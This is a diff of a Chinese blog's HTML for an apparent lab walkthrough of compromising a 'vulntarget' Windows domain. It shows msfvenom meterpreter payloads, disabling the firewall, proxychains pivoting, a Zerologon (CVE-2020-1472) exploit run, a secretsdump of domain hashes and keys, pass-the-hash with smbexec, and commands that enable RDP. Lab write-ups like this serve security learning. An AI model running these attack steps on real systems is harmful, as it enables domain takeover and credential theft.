-<h4 id="CS端口转发尝试上线win2016"><a href="#CS端口转发尝试上线win2016" class="headerlink" title="CS端口转发尝试上线win2016"></a>CS端口转发尝试上线win2016</h4><p>然后尝试使用之前的外网win7的cs beacon 代理连到win2016上</p>
-<p>使用端口转发 右键win7beacon —&gt; pivoting —&gt; Listener … —&gt;</p>
-<p><img src="/posts/3edb83f3/16.png" alt="截图"></p>
+<figure>
+<img src="/posts/3edb83f3/14.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<p><code>netsh advfirewall set allprofiles state off</code>
+关闭防火墙(这里是system权限 直接就可关闭)</p>
+<figure>
+<img src="/posts/3edb83f3/15.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<h4 id="cs端口转发尝试上线win2016">CS端口转发尝试上线win2016</h4>
+<p>然后尝试使用之前的外网win7的cs beacon 代理连到win2016上</p>
+<p>使用端口转发 右键win7beacon ---&gt; pivoting ---&gt; Listener ...
+---&gt;</p>
+<figure>
+<img src="/posts/3edb83f3/16.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>然后保存后会在listeners中生成这个通过win7做代理的listner</p>
-<p>然后去上马，但是上去就会被WinDef给杀掉….. 卡住了昂</p>
-<br>
-
-<h4 id="msf上线win2016"><a href="#msf上线win2016" class="headerlink" title="msf上线win2016"></a>msf上线win2016</h4><h5 id="反向马上线失败了"><a href="#反向马上线失败了" class="headerlink" title="反向马上线失败了"></a>反向马上线失败了</h5><p>这里ip为win7的内网IP</p>
+<p>然后去上马，但是上去就会被WinDef给杀掉..... 卡住了昂</p>
+<p><br></p>
+<h4 id="msf上线win2016">msf上线win2016</h4>
+<h5 id="反向马上线失败了">反向马上线失败了</h5>
+<p>这里ip为win7的内网IP</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.20.98 lport=4444 -f exe &gt; sl.exe   </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.20.98:5555 via the meterpreter on session 2</span><br><span class="line">                                       </span><br></pre></td></tr></table></figure>
-
 <p>然后卡住了</p>
-<br>
-
-<h5 id="使用正向马-成功上线"><a href="#使用正向马-成功上线" class="headerlink" title="使用正向马 成功上线"></a>使用正向马 成功上线</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ msfvenom -p windows/x64/meterpreter/bind_tcp lport=6666 -f exe &gt; 6666.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 496 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/bind_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set rhost 10.0.20.99</span><br><span class="line">rhost =&gt; 10.0.20.99</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started bind TCP handler against 10.0.20.99:6666</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.0.20.99</span><br><span class="line">[*] Meterpreter session 3 opened (10.0.20.98:53533 -&gt; 10.0.20.99:6666) at 2022-03-22 05:46:01 -0400</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN2016</span><br><span class="line">OS              : Windows 2016+ (10.0 Build 14393).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : VULNTARGET</span><br><span class="line">Logged On Users : 4</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">=========</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    10.0.10.110      00:0c:29:be:1e:f6  12</span><br><span class="line">    10.0.10.255      ff:ff:ff:ff:ff:ff  12</span><br><span class="line">    10.0.20.98       00:0c:29:f6:6a:0f  9</span><br><span class="line">    10.0.20.255      ff:ff:ff:ff:ff:ff  9</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  9</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  12</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  9</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  12</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  9</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<p><br></p>
+<h5 id="使用正向马-成功上线">使用正向马 成功上线</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ msfvenom -p windows/x64/meterpreter/bind_tcp lport=6666 -f exe &gt; 6666.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 496 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/bind_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set rhost 10.0.20.99</span><br><span class="line">rhost =&gt; 10.0.20.99</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started bind TCP handler against 10.0.20.99:6666</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.0.20.99</span><br><span class="line">[*] Meterpreter session 3 opened (10.0.20.98:53533 -&gt; 10.0.20.99:6666) at 2022-03-22 05:46:01 -0400</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN2016</span><br><span class="line">OS              : Windows 2016+ (10.0 Build 14393).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : VULNTARGET</span><br><span class="line">Logged On Users : 4</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">=========</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    10.0.10.110      00:0c:29:be:1e:f6  12</span><br><span class="line">    10.0.10.255      ff:ff:ff:ff:ff:ff  12</span><br><span class="line">    10.0.20.98       00:0c:29:f6:6a:0f  9</span><br><span class="line">    10.0.20.255      ff:ff:ff:ff:ff:ff  9</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  9</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  12</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  9</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  12</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  9</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>现在已经得到域内ip段为 <code>10.0.10.0/24</code></p>
 <p>然后定位域控</p>
 <p><code>run post/windows/gather/enum_domain</code></p>
-<p>得到域控为DC名 <code>win2019</code>  IP<code>10.0.10.110</code> 域名 <code>vulntarget</code></p>
-<p><img src="/posts/3edb83f3/17.png" alt="截图"></p>
-<br>
-
+<p>得到域控为DC名 <code>win2019</code> IP<code>10.0.10.110</code> 域名
+<code>vulntarget</code></p>
+<figure>
+<img src="/posts/3edb83f3/17.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
 <p>再添加一个win2016的路由</p>
-<p><code>meterpreter &gt; run post/multi/manage/autoroute </code></p>
-<p><img src="/posts/3edb83f3/18.png" alt="截图"></p>
-<br>
-
-<h3 id="域控win2016"><a href="#域控win2016" class="headerlink" title="域控win2016"></a>域控win2016</h3><h4 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>这里为了节省时间就扫几个端口了 不然太慢了</p>
+<p><code>meterpreter &gt; run post/multi/manage/autoroute</code></p>
+<figure>
+<img src="/posts/3edb83f3/18.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<h3 id="域控win2016">域控win2016</h3>
+<h4 id="端口扫描-1">端口扫描</h4>
+<p>这里为了节省时间就扫几个端口了 不然太慢了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains nmap -Pn -sT 10.0.10.110 -p6379,80,8080,445,139    148 ⨯ 1 ⚙</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-22 06:19 EDT</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:8080 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:139  ...  OK</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:80 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:6379 &lt;--socket error or timeout!</span><br><span class="line">Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 100.00% done; ETC: 06:20 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 10.0.10.110</span><br><span class="line">Host is up (12s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">80/tcp   closed http</span><br><span class="line">139/tcp  open   netbios-ssn</span><br><span class="line">445/tcp  open   microsoft-ds</span><br><span class="line">6379/tcp closed redis</span><br><span class="line">8080/tcp closed http-proxy</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 45.54 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="CVE-2020-1472（置空密码"><a href="#CVE-2020-1472（置空密码" class="headerlink" title="CVE-2020-1472（置空密码)"></a>CVE-2020-1472（置空密码)</h4><p>没啥可以了利用的地方，然后看了下 其他师傅的文章</p>
+<h4 id="cve-2020-1472置空密码">CVE-2020-1472（置空密码)</h4>
+<p>没啥可以了利用的地方，然后看了下 其他师傅的文章</p>
 <p>这里用到了 域内提权</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110     1 ⨯</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Performing authentication attempts...</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">===========================================================</span><br><span class="line">Target vulnerable, changing account password to empty string</span><br><span class="line"></span><br><span class="line">Result: 0</span><br><span class="line"></span><br><span class="line">Exploit complete!</span><br><span class="line">                                                                             </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>然后密码被置空了</p>
-<h4 id="使用impactet"><a href="#使用impactet" class="headerlink" title="使用impactet"></a>使用impactet</h4><p>使用 <code>secretsdump.py</code> dump hash</p>
+<h4 id="使用impactet">使用impactet</h4>
+<p>使用 <code>secretsdump.py</code> dump hash</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/impacket/impacket-0.9.24/examples]</span><br><span class="line">└─$ proxychains python3 secretsdump.py  vulntarget.com/WIN2019\$@10.0.10.110  -just-dc  -no-pass  </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a3dd8e4a352b346f110b587e1d1d1936:::</span><br><span class="line">vulntarget.com\win2016:1601:aad3b435b51404eeaad3b435b51404ee:dfc8d2bfa540a0a6e2248a82322e654e:::</span><br><span class="line">WIN2019$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WIN2016$:1602:aad3b435b51404eeaad3b435b51404ee:f835118efec7ef06133c3f228e69e554:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:70a1edb09dbb1b58f1644d43fa0b40623c014b690da2099f0fc3a8657f75a51d</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:04c435638a00755c0b8f12211d3e88a1</span><br><span class="line">Administrator:des-cbc-md5:dcc29476a789ec9e</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:f7a968745d4f201cbeb73f4b1ba588155cfd84ded34aaf24074a0cfe95067311</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:f401ac35dc1c6fa19b0780312408cded</span><br><span class="line">krbtgt:des-cbc-md5:10efae67c7026dbf</span><br><span class="line">vulntarget.com\win2016:aes256-cts-hmac-sha1-96:e4306bef342cd8215411f9fc38a063f5801c6ea588cc2fee531342928b882d61</span><br><span class="line">vulntarget.com\win2016:aes128-cts-hmac-sha1-96:6da7e9e046c4c61c3627a3276f5be855</span><br><span class="line">vulntarget.com\win2016:des-cbc-md5:6e2901311c32ae58</span><br><span class="line">WIN2019$:aes256-cts-hmac-sha1-96:092c877c3b20956347d535d91093bc1eb16b486b630ae2d99c0cf15da5db1390</span><br><span class="line">WIN2019$:aes128-cts-hmac-sha1-96:0dca147d2a216089c185d337cf643e25</span><br><span class="line">WIN2019$:des-cbc-md5:01c8894f541023bc</span><br><span class="line">WIN2016$:aes256-cts-hmac-sha1-96:f53f26ac32375f204b39a10dbe054714ac57f4ed1604e522db5b2ab51d719760</span><br><span class="line">WIN2016$:aes128-cts-hmac-sha1-96:1deb3de2d7567fd69e91c14c3dff8ce7</span><br><span class="line">WIN2016$:des-cbc-md5:c44cbff1e3153e85</span><br><span class="line">[*] Cleaning up... </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>得到administrator的hash值 <code>aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15</code> </p>
+<p>得到administrator的hash值
+<code>aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15</code></p>
 <p>使用 smbexec 通过administrator的hash连接cmd 拿到域控的cmd</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/impacket/impacket-0.9.24/examples]</span><br><span class="line">└─$ proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110  </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="/posts/3edb83f3/19.png" alt="截图"></p>
-<br>
-
+<p><br></p>
+<figure>
+<img src="/posts/3edb83f3/19.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
 <p>破解hash 去得到域控的登录密码</p>
 <p>得到密码为 Admin@666</p>
-<br>
-
-<h4 id="然后开启3389远程桌面"><a href="#然后开启3389远程桌面" class="headerlink" title="然后开启3389远程桌面"></a>然后开启3389远程桌面</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/3edb83f3/20.png" alt="截图"></p>
-<br>
-
+<p><br></p>
+<h4 id="然后开启3389远程桌面">然后开启3389远程桌面</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure>
+<img src="/posts/3edb83f3/20.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
 <p><code>proxychains rdesktop 10.0.10.110</code></p>
-<br>
-
-<p><img src="/posts/3edb83f3/21.png" alt="截图"></p>
-<p>没连上…  根据报错查了下解决方法：<br>进入windows系统，在“远程桌面”中，将“仅允许使用网络级别身份验证的远程桌面的计算机连接（建议）”勾选去除即可。</p>
+<p><br></p>
+<figure>
+<img src="/posts/3edb83f3/21.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p>没连上... 根据报错查了下解决方法：
+进入windows系统，在“远程桌面”中，将“仅允许使用网络级别身份验证的远程桌面的计算机连接（建议）”勾选去除即可。</p>
 <p>貌似只有这样才能用rdesktop登录</p>
-<p>然后找了另一种方法 下载<code>remmina</code> </p>
+<p>然后找了另一种方法 下载<code>remmina</code></p>
 <p><code>sudo apt install remmina</code></p>
-<p><img src="/posts/3edb83f3/22.png" alt="截图"></p>
+<figure>
+<img src="/posts/3edb83f3/22.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>然后成功登录到域控的远程桌面</p>
-<p><img src="/posts/3edb83f3/23.png" alt="截图"></p>
-<br>
-
-<p>这靶场从开始到现在 搞了快一天了 好多东西都忘记怎么用了，当然也学了些新东西 还是有些收获的。明天再回顾下，然后尝试下koadic </p>
+<figure>
+<img src="/posts/3edb83f3/23.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<p>这靶场从开始到现在 搞了快一天了
+好多东西都忘记怎么用了，当然也学了些新东西
+还是有些收获的。明天再回顾下，然后尝试下koadic</p>
 
     </div>
 
@@ -604,7 +670,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#References"><span class="nav-number">1.</span> <span class="nav-text">References</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%93%E6%89%91%E5%9B%BE"><span class="nav-number">2.</span> <span class="nav-text">拓扑图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7-2019"><span class="nav-number">3.1.</span> <span class="nav-text">域控 2019</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%9C%BA%E5%99%A8-win7"><span class="nav-number">3.2.</span> <span class="nav-text">外网机器 win7</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7-2016"><span class="nav-number">3.3.</span> <span class="nav-text">域内用户 2016</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">4.</span> <span class="nav-text">外网打点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span 